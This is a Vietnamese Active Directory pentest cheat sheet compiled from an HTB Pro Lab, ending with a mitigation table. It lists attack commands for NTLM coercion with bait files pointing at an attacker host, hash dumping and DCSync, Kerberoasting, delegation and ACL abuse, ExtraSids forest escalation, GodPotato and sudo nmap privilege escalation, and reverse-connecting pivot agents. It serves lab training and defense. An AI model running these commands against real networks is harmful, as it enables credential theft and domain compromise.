# Active Directory Pentest Cheat Sheet — rút ra từ HTB Pro Lab Zephyr

> Tổng hợp kỹ thuật, câu lệnh và lỗ hổng/misconfiguration AD đã khai thác trong AD (multi-forest: `painters.htb` ↔ `zsm.local`/`internal.zsm.local`).

## Mục lục

1. [Tổng quan Kill Chain](#1-tổng-quan-kill-chain)
2. [Reconnaissance & Enumeration](#2-reconnaissance--enumeration)
3. [Initial Access](#3-initial-access)
4. [Credential Access](#4-credential-access)
5. [Lateral Movement](#5-lateral-movement)
6. [AD Privilege Escalation](#6-ad-privilege-escalation)
7. [Domain & Forest Trust Escalation](#7-domain--forest-trust-escalation)
8. [Local / OS Privilege Escalation](#8-local--os-privilege-escalation)
9. [Network Pivoting](#9-network-pivoting)
10. [Danh mục Lỗ hổng & Misconfiguration](#10-danh-mục-lỗ-hổng--misconfiguration)
11. [Bảng Công cụ](#11-bảng-công-cụ)

---

## 1. Tổng quan Kill Chain

```
Recon & Enum
   │
   ▼
Initial Access (NTLM Coercion)
   │
   ▼
Credential Dumping (SAM / LSA / NTDS)
   │
   ▼
Lateral Movement (PtH / PtT)
   │
   ▼
AD Privesc (Kerberoast / ACL / Delegation)
   │
   ▼
Domain Admin
   │
   ▼
Cross-Forest Trust Abuse
   │
   ▼
Child → Forest Root (ExtraSids)
   │
   ▼
Forest Compromise
   │
   ▼
Back Tracking (loot reuse)
```

**Nguyên tắc xuyên suốt:** mỗi máy chiếm được không chỉ là mục tiêu, mà là **nguồn credential/loot** cho bước kế tiếp — không có bước nào độc lập.

---

## 2. Reconnaissance & Enumeration

| Kỹ thuật | Câu lệnh | Mục đích |
|---|---|---|
| Ping sweep | `nmap -sn <cidr>` | Tìm live host trước khi quét sâu |
| Full port scan | `nmap -p- --min-rate 3000 -T4 <ip>` | Không bỏ sót cổng dịch vụ ẩn |
| Service/version detection | `nmap -sV -sC -p<ports> <ip>` | Định danh phần mềm, banner, script mặc định |
| SSL cert recon | `nmap --script ssl-cert <ip>` | Lộ SAN/subdomain, IP nội bộ qua chứng chỉ |
| SMB null session | `netexec smb <ip> -u '' -p '' --users` | Enum ẩn danh khi misconfig |
| Authenticated SAMR enum | `netexec smb <ip> -u <user> -p <pass> --users` | Danh sách user domain đầy đủ |
| LDAP enum | `netexec ldap <ip> -u <user> -p <pass> --users/--groups/--computers` | Cấu trúc user/group/computer AD |
| Đọc DACL trực tiếp | `netexec ldap <ip> -M daclread -o TARGET=<obj> ACTION=read` | Tìm quyền bị cấp nhầm trên từng object |
| DNS zone/forwarder | `Get-DnsServerZone`, `dig +tcp <host> @<dc>` | Phát hiện conditional forwarder = dấu hiệu cross-forest trust |
| Trust enum | `Get-ADTrust -Filter * \| select Name,Direction,SIDFilteringEnabled` | Xác định trust hai chiều, SID Filtering có bật không |
| Web fuzzing | ffuf/gobuster trên thư mục MVC lộ (`/views/`, `/models/`) | Tìm route ẩn, source code leak |

> **Bài học:** `SIDFilteringEnabled: {}` (rỗng = false) trên một cross-forest trust là dấu hiệu ngay lập tức của lỗ hổng ExtraSids Attack tiềm năng.

---

## 3. Initial Access

### NTLM Coercion qua File Upload (SMB Responder)

Chuỗi tấn công tận dụng: một biểu mẫu upload file (CV, tài liệu) + cơ chế Windows tự resolve UNC path khi mở file + backend tự động mở file đã upload.

```bash
python3 ntlm_theft.py -g all -s <attacker_ip> -f cv_application
sudo responder -I tun0 -v
# upload file .pdf/.docx độc hại qua form → backend mở → Responder bắt NTLMv2 hash
hashcat -m 5600 hash.txt rockyou.txt --force
```

**Cơ chế:** file chứa UNC path (`\\attacker_ip\share`) — khi mở, Windows tự SMB-authenticate bằng credential của process đang chạy → NTLMv2 challenge-response bị Responder chặn lại → crack offline ra plaintext.

**Điều kiện:** chỉ khai thác được khi có nơi để "ép" một tiến trình Windows mở file/UNC path do attacker kiểm soát (upload form + auto-scan/preview là điểm vào kinh điển).

---

## 4. Credential Access

| Nguồn | Công cụ | Lấy được gì |
|---|---|---|
| SAM/SYSTEM/SECURITY (local) | `reg save HKLM\SAM/SYSTEM/SECURITY` → `secretsdump.py -sam -system -security LOCAL` | NTLM hash local user, cached domain logon (DCC2), LSA secrets |
| NTDS.dit (domain, DRSUAPI) | `secretsdump.py <domain>/<user>@<dc> -just-dc` | Toàn bộ NT hash + Kerberos keys của mọi user/machine trong domain |
| Machine account qua Backup Operators | `netexec smb -M backup_operator` hoặc mount SYSVOL qua CIFS rồi `secretsdump.py LOCAL` | `$MACHINE.ACC` — nếu là hash của DC, luôn có quyền DCSync |
| Kerberoasting | `GetUserSPNs.py <domain>/<user> -request-user <target>` | TGS mã hoá bằng NT hash service account → crack offline |
| DPAPI (Chrome/Edge saved password) | `netexec smb -M dpapi` hoặc `dpapi::chrome` với masterkey | Credential trình duyệt đã lưu của user khác |
| Source code / config file | `grep -r "password" /var/www` | Credential DB hardcode trong code tự viết |
| MySQL/MSSQL table | `SELECT * FROM users` | Password hash (bcrypt) của tài khoản ứng dụng |

**Hashcat mode tham khảo:**

| Loại hash | Mode | Ví dụ |
|---|---|---|
| NTLMv2 (Responder) | `5600` | `NTLMv2-SSP` |
| Kerberos TGS RC4 (`$krb5tgs$23$`) | `13100` | Kerberoasting cổ điển |
| Kerberos TGS AES256 (`$krb5tgs$18$`) | `19700` | Kerberoasting AES |
| bcrypt (`$2y$`) | `3200` | Password ứng dụng web/Zabbix |

---

## 5. Lateral Movement

| Kỹ thuật | Câu lệnh | Ghi chú |
|---|---|---|
| Pass-the-Hash (WinRM) | `evil-winrm -i <ip> -u <user> -H <nthash>` | NTLM chấp nhận hash thay password nhờ challenge-response |
| Pass-the-Hash (SMB exec) | `netexec smb <ip> -u <user> -H <hash> -x "<cmd>"` | Dùng khi WinRM bị chặn ở tầng authorization |
| PSExec/WMIExec/SMBExec | `psexec.py`/`wmiexec.py`/`smbexec.py <domain>/<user>@<ip> -hashes <lm:nt>` | Mỗi tool dùng cơ chế khác nhau (service/DCOM/named-pipe) — nếu 1 cái bị AV chặn, thử cái khác |
| Pass-the-Ticket / Kerberos | `getTGT.py`, `export KRB5CCNAME=<ccache>`, `-k -no-pass` | Dùng TGT có sẵn thay vì password/hash |
| Đọc file thuần qua SMB (né AV) | `smbclient.py <domain>/<user>@<ip> -hashes <hash>` rồi `get <file>` | Không exec, không tạo file tạm → không bị Defender chặn |
| Cần hostname/SPN chính xác | Kerberos ticket chỉ hợp lệ cho đúng SPN đã cấp | Luôn map hostname vào `/etc/hosts` khi làm việc với Kerberos |

> **Bài học quan trọng:** NTLM PtH với username không kèm domain (`-u Administrator`) sẽ bị hiểu là **local logon** — phải chỉ định `'<domain>\Administrator'` khi hash là của domain account, nếu không auth sẽ fail dù hash đúng.

---

## 6. AD Privilege Escalation

### Kerberoasting

Bất kỳ domain user nào cũng có quyền request TGS cho SPN bất kỳ (hành vi hợp lệ theo thiết kế) → TGS bị mã hoá bằng hash của service account → crack offline không cần tương tác thêm với DC.

```bash
GetUserSPNs.py <domain>/<user> -dc-ip <dc> -request-user <target_spn_account>
```

### ACL Abuse — Force-Change-Password

Quyền `User-Force-Change-Password` cho phép đặt lại mật khẩu người khác **không cần biết mật khẩu cũ**.

```bash
rpcclient -U '<account>%<password>' <dc>
rpcclient $> setuserinfo2 <target> 23 '<newpass>'
```

> **Lưu ý:** module `netexec ... -M change-password` gọi API SAMR `ChangePasswordUser2` — chỉ tự đổi mật khẩu **của chính principal đang auth**, không đổi được của người khác dù truyền `USERNAME=<target>`. Phải dùng `rpcclient setuserinfo2` (level 23) mới đúng API Force-Change-Password.

### Constrained Delegation — S4U2Self + S4U2Proxy

```bash
getST.py -spn '<service>/<host>' -impersonate 'Administrator' '<domain>/<user>:<pass>' -dc-ip <dc>
```

- **S4U2Self**: user có `TRUSTED_TO_AUTH_FOR_DELEGATION` (Protocol Transition) xin vé đại diện cho bất kỳ ai, không cần biết mật khẩu người đó.
- **S4U2Proxy**: đổi vé đó thành vé hợp lệ cho đúng SPN được ủy quyền (`msDS-AllowedToDelegateTo`).

### Shadow Credentials

```bash
certipy shadow auto -u <user> -p <pass> -account '<target_computer>$' -dc-ip <dc>
```

Ghi public key vào `msDS-KeyCredentialLink` của object khác (cần quyền `WriteProperty` trên thuộc tính này) → xác thực PKINIT bằng private key tương ứng → trích xuất NT hash qua kỹ thuật U2U.

### Self-Membership (Validated Write)

Một ACE `WriteProperty` trên chính thuộc tính `member` cho phép **tự thêm chính mình** vào group (không thêm được người khác) — dễ bị bỏ sót vì tên gọi giống `WriteProperty` thường.

### DCSync

```bash
secretsdump.py '<domain>/<computer>$'@<dc> -hashes <lm:nt> -just-dc-ntlm
```

Máy đã compromise mang machine account hash và có quyền replicate (`Get Replication Changes`) — điển hình nhất là chính machine account của một DC, luôn có quyền này theo mặc định.

---

## 7. Domain & Forest Trust Escalation

| Loại trust | SID Filtering | Kỹ thuật khả thi |
|---|---|---|
| External/Cross-forest (`painters.htb` ↔ `zsm.local`) | Bật (mặc định) | Forge với SID History bị chặn (`KDC_ERR_TGT_REVOKED`); phải dùng inter-realm TGT thật (`getTGT.py` + `getST.py` referral) |
| Parent-Child trong cùng forest (`internal.zsm.local` → `zsm.local`) | **Tắt mặc định** | ExtraSids/SID History Injection khai thác được trọn vẹn |

### ExtraSids Attack (child → forest root)

```bash
raiseChild.py <child_domain>/Administrator -hashes <lm:nt> -target-exec <forest_root_dc_ip>
```

Tự động hoá: DCSync krbtgt của child → forge Golden Ticket cho Administrator của child, gắn `ExtraSid` = SID của `Enterprise Admins` bên forest root → dùng ticket đó DCSync forest root.

### Nhận diện trust dễ bị khai thác

```powershell
Get-ADTrust -Filter * | Select Name, Direction, SIDFilteringEnabled
```

`SIDFilteringEnabled: {}` (rỗng/false) trên trust là dấu hiệu trực tiếp.

### Ghi chú thất bại tái hiện (PAC hardening)

Kỹ thuật forge/chỉnh sửa PAC (Diamond Ticket) có thể **không tái hiện ổn định 100%** trên Windows Server 2022 dù không có patch/config nào thay đổi — nguyên nhân chính xác chưa xác định được dứt khoát (đã loại trừ: hash đổi, lệch giờ, registry PAC validation override, Windows Update mới). Một TGT thật không chỉnh sửa (`getTGT.py`) luôn ổn định.

> **Bài học vận hành:** lưu lại NT hash trích xuất được từ lần forge thành công đầu tiên — không cần lặp lại kỹ thuật forge để regain access, chỉ cần Pass-the-Hash trực tiếp.

---

## 8. Local / OS Privilege Escalation

### GodPotato (SeImpersonatePrivilege)

```bash
GodPotato-NET4.exe -cmd "cmd /c type C:\...\flag.txt"
```

Service account có `SeImpersonatePrivilege` (rất phổ biến ở service account như `nt service\mssqlserver`) → tạo named pipe bẫy RPCSS kết nối dưới danh tính SYSTEM → unmarshal DCOM object → impersonate token SYSTEM. Hoạt động ổn định từ Server 2012 tới 2022.

> **Lưu ý ghi file:** một số thư mục (`C:\Windows\Temp`) có thể bị chặn ghi bất thường đối với service account dù không báo lỗi rõ ràng — luôn thử `C:\Users\Public` làm phương án dự phòng.

### sudo NSE Script Abuse (Linux)

```bash
sudo -l   # xác nhận NOPASSWD trên nmap
echo 'hostrule=function() return true end
action=function() os.execute("...") return "ok" end' > x.nse
sudo nmap --script=x.nse -sn 127.0.0.1
```

Nmap Scripting Engine thực thi code Lua **top-level trước khi validate cấu trúc script** → code ngoài function `action` chạy ngay cả khi thiếu field bắt buộc. `chmod 4755` chỉ nên gọi **một lần** khi set SUID — gọi `chmod 755` sau đó sẽ xoá mất SUID bit.

### SeBackupPrivilege / Backup Operators

```bash
netexec smb <ip> -u <user> -p <pass> -M backup_operator
```

`SeBackupPrivilege` đọc được **bất kỳ file nào** qua Windows Backup API, bỏ qua hoàn toàn ACL/NTFS thông thường — đủ để lấy SAM/SYSTEM/SECURITY từ xa mà không cần shell tương tác.

---

## 9. Network Pivoting

Kiến trúc **Ligolo-ng** gồm **Proxy** (máy attacker) + nhiều **Agent** (mỗi máy đã compromise), mỗi agent mở ra route dựa trên góc nhìn mạng thực tế của chính nó — Proxy không tự tạo kết nối, chỉ forward qua đúng agent tương ứng với route đã khai báo.

```bash
# Trên attacker: chạy Ligolo proxy, lắng nghe agent
# Trên máy compromise: chạy agent, kết nối ngược
./agent -connect <attacker_ip>:443 -ignore-cert &
# Trong Ligolo console
tunnel_start --tun ligoloN
# Trên attacker: thêm route cho subnet mới
sudo ip route add <subnet>/24 dev ligoloN
```

> **Nguyên tắc:** khi firewall/VLAN chặn route từ điểm pivot hiện tại tới một subnet mới, triển khai thêm agent **trên chính máy đã xác nhận có route** (kiểm tra bằng `Test-NetConnection`/ARP cache từ máy đó) — không phải trên máy attacker.

---

## 10. Danh mục Lỗ hổng & Misconfiguration

| # | Lỗ hổng/Misconfiguration | Hậu quả trong lab | Cách phòng chống |
|---|---|---|---|
| 1 | Windows tự SMB-auth khi resolve UNC path trong file mở tự động | NTLMv2 hash bị Responder chặn → crack ra plaintext | Chặn SMB outbound tới internet, buộc SMB signing, disable auto-preview file upload |
| 2 | Credential hardcode trong source code | Lộ password DB trực tiếp | Dùng biến môi trường/secret vault, không commit credential |
| 3 | SMB Null Session + Anonymous SAMR | Enum toàn bộ user domain không cần credential | `RestrictAnonymousSAM = 1`/2, tắt null session |
| 4 | Local Administrator hash trùng nhiều máy | Pass-the-Hash lan rộng | LAPS — mỗi máy một mật khẩu ngẫu nhiên riêng |
| 5 | SPN gắn trên user account thường thay vì machine/service account | Kerberoastable, dễ bị nhắm mục tiêu | Dùng gMSA, mật khẩu dài + random |
| 6 | ACE Force-Change-Password cấp nhầm cho machine account | Reset password không cần biết password cũ → chiếm tài khoản có delegation | Audit định kỳ DACL trên toàn bộ object nhạy cảm |
| 7 | Constrained Delegation with Protocol Transition cấu hình lỏng lẻo | S4U2Self/S4U2Proxy mạo danh Administrator | Hạn chế tối đa Protocol Transition, review `msDS-AllowedToDelegateTo` |
| 8 | `WriteProperty` trên `msDS-KeyCredentialLink` cấp nhầm | Shadow Credentials → trích xuất NT hash không cần password | Giám sát thay đổi thuộc tính này, giới hạn quyền ghi |
| 9 | Self-Membership ACE trên group đặc quyền | User/machine tự thêm mình vào group quản trị | Không dùng Validated Write cho group nhạy cảm |
| 10 | Cross-forest trust bật `SIDFilteringEnabled = False` | ExtraSids Attack khả thi | Luôn bật SID Filtering/Quarantine trên external trust |
| 11 | `SeImpersonatePrivilege` mặc định trên service account | Potato attack → SYSTEM | Áp dụng least privilege cho service account |
| 12 | `sudo` NOPASSWD trên binary có khả năng thực thi lệnh (nmap NSE) | Privilege escalation lên root | Không cấp sudo NOPASSWD cho binary có scripting engine |
| 13 | Zabbix SAML cookie không verify toàn bộ cấu trúc (CVE-2022-23131) | Bypass authentication, chiếm Super Admin | Cập nhật Zabbix ≥ 5.4.9 |
| 14 | Backup Operators cấp cho user không cần thiết | Đọc mọi file hệ thống qua SeBackupPrivilege, dẫn tới DCSync | Chỉ cấp cho tài khoản backup chuyên dụng |
| 15 | Password reuse giữa tài khoản local và tài khoản AD | Một mật khẩu crack được mở khóa cả 2 hệ thống | Cấm password reuse, MFA cho tài khoản đặc quyền |

---

## 11. Bảng Công cụ

| Công cụ | Mục đích chính |
|---|---|
| `nmap` | Host discovery, port/service scan |
| `netexec` (nxc) | SMB/LDAP/WinRM enum, PtH, module (dacl, dpapi, backup_operator) |
| `responder` | Bắt NTLMv2 hash qua LLMNR/NBT-NS/SMB coercion |
| `ntlm_theft` | Sinh file mồi chứa UNC path để coerce authentication |
| `hashcat` | Crack offline (NTLMv2, Kerberos TGS, bcrypt) |
| Impacket suite (`secretsdump.py`, `GetUserSPNs.py`, `getTGT.py`, `getST.py`, `ticketer.py`, `raiseChild.py`, `psexec.py`/`wmiexec.py`/`smbexec.py`, `mssqlclient.py`, `smbclient.py`) | Toàn bộ thao tác Kerberos, dump credential, lateral movement, MSSQL |
| `evil-winrm` | Shell tương tác qua WinRM (password/hash) |
| `rpcclient` | Gọi trực tiếp SAMR API (đổi mật khẩu đúng API) |
| `bloodyAD` | Thao tác AD (group membership, set password) bằng hash |
| `certipy` | Shadow Credentials, khai thác AD CS |
| `mimikatz`/`pypykatz` | DPAPI decrypt, LSASS credential |
| `Ligolo-ng` | Network pivoting đa agent |
| `GodPotato` | Local privesc từ SeImpersonatePrivilege lên SYSTEM |

---

*Tài liệu tổng hợp từ HTB Pro Lab Zephyr (17 flag, multi-forest AD). Xem write-up chi tiết từng flag trong `ZEPHYR-WRITEUP.md`.*
